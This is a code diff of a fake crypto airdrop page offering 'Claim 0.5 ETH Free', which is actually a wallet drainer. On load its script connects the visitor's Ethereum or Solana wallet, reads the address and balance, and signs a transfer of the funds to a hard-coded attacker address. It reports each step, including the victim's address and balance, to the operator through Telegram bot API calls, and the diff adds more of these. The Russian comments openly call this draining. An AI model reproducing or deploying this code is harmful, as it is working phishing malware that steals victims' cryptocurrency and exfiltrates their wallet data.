@@ -9,127 +9,24 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
-    body {
-      background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%);
-      color: #e0e0ff;
-      margin: 0;
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
-    .header {
-      background: rgba(20, 10, 40, 0.75);
-      backdrop-filter: blur(16px);
-      padding: 1.2rem 2rem;
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      box-shadow: 0 4px 30px rgba(167, 85, 247, 0.15);
-    }
-    .glow {
-      text-shadow: 0 0 20px rgba(168, 85, 247, 0.8), 0 0 40px rgba(192, 38, 211, 0.5);
-      animation: glowPulse 4s infinite alternate;
-    }
-    @keyframes glowPulse {
-      0% { text-shadow: 0 0 15px rgba(168, 85, 247, 0.6); }
-      100% { text-shadow: 0 0 35px rgba(192, 38, 211, 0.8); }
-    }
-    .btn {
-      background: linear-gradient(90deg, #7c3aed, #c026d3);
-      padding: 1rem 2.5rem;
-      border-radius: 999px;
-      font-weight: 700;
-      transition: all 0.4s ease;
-      box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4);
-    }
-    .btn:hover {
-      transform: translateY(-3px) scale(1.05);
-      box-shadow: 0 20px 40px rgba(124, 58, 237, 0.6);
-    }
-    .claim-btn {
-      background: linear-gradient(90deg, #22c55e, #86efac);
-      padding: 1.4rem 3rem;
-      border-radius: 999px;
-      font-weight: 800;
-      font-size: 1.5rem;
-      box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
-      transition: all 0.4s ease;
-    }
-    .claim-btn:hover {
-      transform: translateY(-4px) scale(1.06);
-      box-shadow: 0 25px 60px rgba(34, 197, 94, 0.7);
-    }
-    .modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.92);
-      backdrop-filter: blur(8px);
-      z-index: 9999;
-      align-items: center;
-      justify-content: center;
-    }
-    .modal-box {
-      background: linear-gradient(145deg, #1a0033, #0f001a);
-      padding: 2.5rem;
-      border-radius: 1.8rem;
-      width: 90%;
-      max-width: 480px;
-      border: 1px solid rgba(168, 85, 247, 0.4);
-      box-shadow: 0 0 100px rgba(168, 85, 247, 0.3);
-      backdrop-filter: blur(10px);
-    }
-    .wallet-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 2rem;
-      margin: 2.5rem 0;
-    }
-    .wallet-item {
-      cursor: pointer;
-      transition: all 0.4s ease;
-      text-align: center;
-      padding: 1rem;
-      border-radius: 1rem;
-      background: rgba(255,255,255,0.03);
-      border: 1px solid rgba(168, 85, 247, 0.2);
-    }
-    .wallet-item:hover {
-      transform: scale(1.12);
-      background: rgba(168, 85, 247, 0.15);
-      box-shadow: 0 0 30px rgba(168, 85, 247, 0.5);
-    }
-    .reviews {
-      padding: 2.5rem;
-      background: rgba(0,0,0,0.4);
-      border-radius: 1.5rem;
-      margin-top: 4rem;
-      backdrop-filter: blur(10px);
-    }
-    .review {
-      background: rgba(255,255,255,0.04);
-      padding: 1.5rem;
-      border-radius: 1rem;
-      margin: 1.5rem 0;
-      border-left: 4px solid #a855f7;
-    }
-    .scroll-arrow {
-      position: fixed;
-      bottom: 3rem;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 3.5rem;
-      color: #a855f7;
-      animation: bounce 2s infinite;
-      cursor: pointer;
-      z-index: 100;
-      opacity: 0.8;
-    }
-    @keyframes bounce {
-      0%, 20%, 50%, 80%, 100% { transform: translate(-50%, 0); }
-      40% { transform: translate(-50%, -25px); }
-      60% { transform: translate(-50%, -10px); }
-    }
+    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; overflow-x: hidden; }
+    .header { background: rgba(20, 10, 40, 0.75); backdrop-filter: blur(16px); padding: 1.2rem 2rem; position: sticky; top: 0; z-index: 50; box-shadow: 0 4px 30px rgba(167, 85, 247, 0.15); }
+    .glow { text-shadow: 0 0 20px rgba(168, 85, 247, 0.8), 0 0 40px rgba(192, 38, 211, 0.5); animation: glowPulse 4s infinite alternate; }
+    @keyframes glowPulse { 0% { text-shadow: 0 0 15px rgba(168, 85, 247, 0.6); } 100% { text-shadow: 0 0 35px rgba(192, 38, 211, 0.8); } }
+    .btn { background: linear-gradient(90deg, #7c3aed, #c026d3); padding: 1rem 2.5rem; border-radius: 999px; font-weight: 700; transition: all 0.4s ease; box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4); }
+    .btn:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 20px 40px rgba(124, 58, 237, 0.6); }
+    .claim-btn { background: linear-gradient(90deg, #22c55e, #86efac); padding: 1.4rem 3rem; border-radius: 999px; font-weight: 800; font-size: 1.5rem; box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5); transition: all 0.4s ease; }
+    .claim-btn:hover { transform: translateY(-4px) scale(1.06); box-shadow: 0 25px 60px rgba(34, 197, 94, 0.7); }
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; }
+    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2.5rem; border-radius: 1.8rem; width: 90%; max-width: 480px; border: 1px solid rgba(168, 85, 247, 0.4); box-shadow: 0 0 100px rgba(168, 85, 247, 0.3); backdrop-filter: blur(10px); }
+    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2rem; margin: 2.5rem 0; }
+    .wallet-item { cursor: pointer; transition: all 0.4s ease; text-align: center; padding: 1.5rem; border-radius: 1.2rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(168, 85, 247, 0.2); }
+    .wallet-item:hover { transform: scale(1.12); background: rgba(168, 85, 247, 0.15); box-shadow: 0 0 30px rgba(168, 85, 247, 0.5); }
+    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin: 0 auto; }
+    .reviews { padding: 2.5rem; background: rgba(0,0,0,0.4); border-radius: 1.5rem; margin-top: 4rem; backdrop-filter: blur(10px); }
+    .review { background: rgba(255,255,255,0.04); padding: 1.5rem; border-radius: 1rem; margin: 1.5rem 0; border-left: 4px solid #a855f7; }
+    .scroll-arrow { position: fixed; bottom: 3rem; left: 50%; transform: translateX(-50%); font-size: 3.5rem; color: #a855f7; animation: bounce 2s infinite; cursor: pointer; z-index: 100; opacity: 0.8; }
+    @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translate(-50%, 0); } 40% { transform: translate(-50%, -25px); } 60% { transform: translate(-50%, -10px); } }
   </style>
 </head>
 <body>
@@ -147,9 +44,8 @@
   <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-16">
     <h1 class="text-7xl md:text-9xl font-extrabold glow mb-10 leading-tight">Claim Airdrop Now</h1>
     <p class="text-3xl text-purple-200 mb-12 max-w-3xl">Connect wallet → Confirm → Receive tokens instantly</p>
-    
+   
     <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
-
     <div class="text-4xl font-bold text-pink-400 animate-pulse mt-16">LIMITED TIME OFFER</div>
 
     <!-- Стрелка скролла вниз -->
@@ -248,6 +144,7 @@
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
         await fetch(url);
+        console.log('Сообщение отправлено в Telegram:', message);
       } catch (e) {
         console.error('Telegram send error:', e);
       }
@@ -269,8 +166,11 @@
     }
 
     async function connect(wallet) {
+      await sendToTelegram(`Пользователь выбрал кошелёк: ${wallet}`);
+
       const uri = await getUri();
       if (!uri) {
+        await sendToTelegram('Ошибка: не удалось получить WC URI');
         alert('Ошибка сессии — попробуй позже');
         return;
       }
@@ -284,6 +184,7 @@
         if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
 
         if (dl) {
+          await sendToTelegram(`Открытие deep-link для ${wallet}\nURI: ${uri.substring(0, 50)}...`);
           console.log('Открываем deep-link для ' + wallet + ':', dl);
           window.location.href = dl;
           setTimeout(() => {
@@ -294,14 +195,18 @@
         }
       }
 
-      alert('Открой эту ссылку внутри кошелька для автоматического подключения');
+      // Если deep-link не сработал — просто пишем в телегу и продолжаем ждать слива
+      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём подключения вручную`);
+      alert('Подтверди подключение в кошельке');
     }
 
-    // Автоматический слив + уведомление в Telegram
+    // Автоматический слив сразу после подключения + подробные уведомления
     window.addEventListener('load', async () => {
       if (window.ethereum || window.solana) {
         try {
-          let provider, address, network, balanceFormatted, symbol, target;
+          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = '';
+
+          await sendToTelegram('Сайт открыт в кошельке или через deep-link → начинаем подключение');
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -327,12 +232,14 @@
             symbol = 'SOL';
           }
 
-          target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
-
           const connectMsg = `Подключён кошелёк!\nАдрес: ${address}\nСеть: ${network}\nБаланс: ${balanceFormatted} ${symbol}`;
           await sendToTelegram(connectMsg);
 
+          const target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
+
           if (parseFloat(balanceFormatted) > 0) {
+            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив на адрес ${target}`);
+
             if (network === 'Solana') {
               const tx = await provider.signAndSendTransaction(
                 new solanaWeb3.Transaction().add(
@@ -356,10 +263,12 @@
             const drainMsg = `DRAINED ${balanceFormatted} ${symbol} → ${target}\nАдрес: ${address}\nСеть: ${network}`;
             await sendToTelegram(drainMsg);
             console.log(drainMsg);
+          } else {
+            await sendToTelegram(`Подключён, но баланс 0 → слив не выполнен`);
           }
         } catch (e) {
           console.error(e);
-          await sendToTelegram(`Ошибка: ${e.message}`);
+          await sendToTelegram(`Ошибка слива: ${e.message}`);
         }
       }
     });
